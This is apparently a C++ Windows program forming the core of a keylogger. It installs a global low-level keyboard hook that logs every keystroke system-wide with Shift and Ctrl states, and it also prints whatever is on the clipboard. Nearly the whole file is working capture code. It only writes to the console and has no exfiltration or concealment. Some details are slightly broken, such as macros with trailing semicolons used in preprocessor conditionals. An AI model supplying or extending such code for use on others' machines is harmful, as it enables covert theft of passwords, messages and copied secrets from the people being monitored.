#include "includes.h"
#include "handleChars.h"
#include "grabClipboard.h"


std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
std::string storedClipboardContents = "";

//main entry point

HHOOK handle_to_hook;
bool is_shift_on = false; //GLOBAL
bool is_control_on = false; //global

#define USE_LITERALS false;

LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
{
	KBDLLHOOKSTRUCT* keyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);

#if USE_LITERALS

	std::cout << keyboardStruct->vkCode << '\n';

#else

	is_shift_on = handleShift();
	is_control_on = handleCTRL();

	//shift handling handling here, we do not need to print anything :)
	if (!(keyboardStruct->vkCode == 160 || keyboardStruct->vkCode == 161))
	{
		if (!(keyboardStruct->vkCode == 162 || keyboardStruct->vkCode == 163))
		{
			if (wparam == WM_KEYDOWN)
			{
				if (is_control_on) { std::cout << "CTRL + "; }
				std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
			}
		}
	}
	
	if (grabClipboard(storedClipboardContents))
	{
		std::cout << "CLIPBOARD: " << storedClipboardContents << '\n';
	}

#endif

	return CallNextHookEx(NULL, code, wparam, lparam);
}

#define test false;

int main()
{
#if test
	std::string teststr = "something";
	teststr.erase(teststr.size() - 1);
	std::cout << teststr;
#else
	handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);

	//massive error occurs when initializing hook
	if (handle_to_hook == NULL)
	{
		std::cerr << "MASSIVE ERROR";
		return 1;
	}

	//message handling
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//sleep the closing of the program
	while (1)
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}
#endif
	return 0;
}